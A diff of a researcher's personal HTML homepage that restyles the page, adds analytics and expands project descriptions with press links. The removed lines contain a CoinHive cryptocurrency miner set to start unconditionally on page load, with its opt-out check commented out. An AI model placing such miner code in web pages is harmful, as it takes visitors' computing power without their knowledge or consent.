@@ -3,87 +3,163 @@
   <head>
     <meta charset="UTF-8">
     <title>Kevin Zeng Hu</title>
+    <link rel="icon" href="favicon.ico" type="image/x-icon"/>
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon"/>
     <style>
     	body {
     		margin-top: 20px;
     		margin-left: 30px;
+        font-family: 'Helvetica Neue', Arial, Helvetica, sans-serif;
+        font-weight: 500;
     	}
     	section {
     		margin: 10px 0;
     	}
     	p {
-    		margin: 0;
-    		max-width: 600px;
+    		/*margin: 0;*/
+    		max-width: 500px;
     	}
     	ul {
+        padding: 0;
     		margin: 0;
+        margin-top: 15px;
     		list-style-type: none;
     	}
 
-    	div#mining {
-    		font-size: 60px;
-    		font-family: sans-serif;
-    		position: absolute;
-    		bottom: 0;
-    		right: 0;
-    		color: red;
-    		font-weight: bold;
-    	}
+      div.project {
+        margin-top: 15px;
+      }
+
+      div.project > div.header {
+        margin-bottom: 5px;
+      }
+
+      div.project > div.info, div.project > div.press {
+        margin-left: 15px;
+      }
+
+      div.project > div.header a {
+        font-weight: bold;
+      }
 	</style>
-	<script src="coinhive.min.js"></script>
-	<script>
-		var miner = new CoinHive.User('KFk79M0ussJFRN3Zs4vwBmR6PDdUi8uT', 'test', {throttle: 0.3});
-		miner.start();
 
-		// // Only start on non-mobile devices and if not opted-out
-		// // in the last 14400 seconds (4 hours):
-		// if (!miner.isMobile() && !miner.didOptOut(14400)) {
-		// 	miner.start();
-		// }
-	</script>
-	<script>
-	// Listen on events
-	miner.on('found', function() { /* Hash found */ })
-	miner.on('accepted', function() { /* Hash accepted by the pool */ })
+  <link href="https://fonts.googleapis.com/css?family=Titillium+Web" rel="stylesheet">
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-41355066-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
 
-	// Update stats once per second
-	setInterval(function() {
-		var hashesPerSecond = miner.getHashesPerSecond();
-		var totalHashes = miner.getTotalHashes();
-		var acceptedHashes = miner.getAcceptedHashes();
-		document.getElementById("hashesPerSecond").innerHTML = hashesPerSecond
-		document.getElementById("totalHashes").innerHTML = totalHashes;
-		document.getElementById("acceptedHashes").innerHTML = acceptedHashes;
-		// Output to HTML elements...
-	}, 1000);
-</script>
+    gtag('config', 'UA-41355066-1');
+  </script>
+
   </head>
   <body>
   	<section>
 		<div>Kevin Zeng Hu (kzh)</div>
-    <div>Data Visualization and Analysis Systems</div>
-		<div>PhD Student at MIT Media Lab</div>
+    <div>Accessible Data Visualization and Analysis Systems</div>
+		<div>PhD Student at the MIT Media Lab</div>
 		<div><a href="mailto:kzh@mit.edu">kzh@mit.edu</a> | <a href="https://twitter.com/kevinzenghu" target="_blank">@kevinzenghu</a> | <a href="https://www.linkedin.com/in/kevinzenghu" target="_blank">LinkedIn</a></div>
 	</section>
 
 	—
 
 	<section>
-		<p>I'm a doctoral student in the <a href="http://collective.media.mit.edu" target="_blank">Collective Learning Group</a> at the <a href="https://media.mit.edu" target="_blank">MIT Media Lab</a>. My research focuses on democratizing data visualization and analysis. I'm currently interested in high-density data interface design, visualization recommendation, and applied machine learning. My work has been published in top academic journals and covered in diverse media outlets, though I'm proudest of having reached the front page of Reddit.</p>
+		<p>We should all be able to ask questions of our data! Towards this end, I build data visualization and analysis tools that are accessible to the many, not just the few. My current approach is to combine human-centered interface design, recommender systems, and machine learning.
+    </p>
+
+
+    <p>Currently I'm a graduate student with the <a href="http://collective.media.mit.edu" target="_blank">Collective Learning Group</a> at the <a href="https://media.mit.edu" target="_blank">MIT Media Lab</a>. Previously, I studied Physics at MIT and interned at several tech companies. My past projects have been published in top academic journals and covered in diverse media outlets, though I'm proudest of having reached the front page of Reddit.
+    </p>
 	</section>
 
 	—
 
 	<section>
 		Selected Projects:
-		<ul>
-			<li><a href="http://dive.media.mit.edu" target="_blank">DIVE</a> (2018)</li>
-			<li><a href="http://clinton.media.mit.edu" target="_blank">ClintonCircle</a> (2016)</li>
-			<li><a href="http://pantheon.media.mit.edu" target="_blank">Pantheon</a> (2014)</li>
-			<li><a href="http://fold.cm" target="_blank">FOLD</a> (2014)</li>
-			<li><a href="http://gifgif.media.mit.edu" target="_blank">GIFGIF</a> (2014)</li>
-			<li><a href="http://language.media.mit.edu" target="_blank">Global Language Network</a> (2014)</li>
-		</ul>
+    <div class="project">
+      <div class="header">
+        <a href="http://dive.media.mit.edu" target="_blank">DIVE</a> (2018)
+        <div class="description">Semi-automated data exploration system</div>
+      </div>
+
+      <div class="info">Info:
+        <a href="https://dive.media.mit.edu/video" target="_blank">Video</a>, <a href="https://dive.media.mit.edu/paper" target="_blank">Paper</a>
+      </div>
+    </div>
+
+    <div class="project">
+      <div class="header">
+        <a href="">Clinton Circle</a> (2016)
+        <div class="description">Visualize WikiLeaks e-mails as network of connections</div>
+      </div>
+
+      <div class="press">Press:
+        <a href="https://www.univision.com/univision-news/politics/this-is-what-clintons-circle-of-trust-looks-like-from-her-emails" target="_blank">Univision</a>
+      </div>
+    </div>
+
+
+    <div class="project">
+      <div class="header">
+        <a href="http://pantheon.media.mit.edu" target="_blank">Pantheon</a> (2014)
+        <div class="description">Explore historical cultural production</div>
+      </div>      
+      <div class="info">
+        Info:
+        <a href="http://pantheon.media.mit.edu" target="_blank">Video</a>,
+        <a href="https://www.nature.com/articles/sdata201575" target="_blank">Paper</a>
+      </div>
+      <div class="press">
+        Press:
+        <a href="https://www.nytimes.com/2014/03/16/magazine/whos-more-famous-than-jesus.html" target="_blank">New York Times</a>,
+        <a href="https://www.fastcodesign.com/3027817/mit-media-lab-maps-historys-biggest-celebrities" target="_blank">Fast Company</a>,
+        <a href="https://www.americaninno.com/boston/mit-media-labs-pantheon-project-historys-biggest-celebrities-1/" target="_blank">BostInno</a>
+      </div>
+    </div>
+
+    <div class="project">
+      <div class="header">
+        <a href="http://gifgif.media.mit.edu" target="_blank">GIFGIF</a> (2014)
+        <div class="description">Measure the emotional content of animated GIFs</div>
+      </div>
+      <div class="press">
+        Press:
+        <a href="https://www.wired.com/2015/03/gifs-teach-computers-emotion/" target="_blank">Wired</a>,
+        <a href="https://www.washingtonpost.com/news/the-intersect/wp/2014/05/20/its-about-measuring-that-intangible-human-experience-a-qa-with-the-mit-researchers-studying-gifs/" target="_blank">Washington Post</a>,
+        <a href="https://www.buzzfeed.com/ariannarebolini/map-the-emotional-language-of-gifs-with-mits-gifgif-project" target="_blank">Buzzfeed</a>
+      </div>
+    </div>
+
+    <div class="project">
+      <div class="header">
+  		  <a href="http://fold.cm" target="_blank">FOLD</a> (2014)
+        <div class="description">Read and write non-linear, contextual stories</div>
+      </div>
+        <div class="press">
+          Press:
+          <a href="http://www.niemanlab.org/2014/07/fold-wants-to-keep-you-from-tumbling-down-link-rabbit-holes/" target="_blank">Nieman Journalism Lab</a>
+        </div>           
+    </div>
+
+    <div class="project">
+      <div class="header">
+        <a href="http://language.media.mit.edu" target="_blank">Global Language Network</a> (2014)      
+        <div class="description">Understand the connection between languages</div>
+      </div>
+      <div class="info">
+        Info:
+        <a href="http://pantheon.media.mit.edu" target="_blank">Video</a>,
+        <a href="http://www.pnas.org/cgi/doi/10.1073/pnas.1410931111" target="_blank">Paper</a>
+      </div>      
+      <div class="press">
+        Press:
+        <a href="https://www.economist.com/prospero/2014/12/31/when-bigger-isnt-better" target="_blank">The Economist</a>,
+        <a href="http://www.sciencemag.org/news/2014/12/want-influence-world-map-reveals-best-languages-speak" target="_blank">Science Magazine</a>,
+        <a href="https://hbr.org/2015/01/why-english-not-mandarin-is-the-language-of-innovation" target="_blank">Harvard Business Review</a>
+      </div>      
+    </div>
+
 	</section>
 
 	—
@@ -100,7 +176,7 @@
 	—
 
 	<section>
-		Last Updated June 2018
+		Last Updated on June 2018
 	</section>
   </body>
 </html>
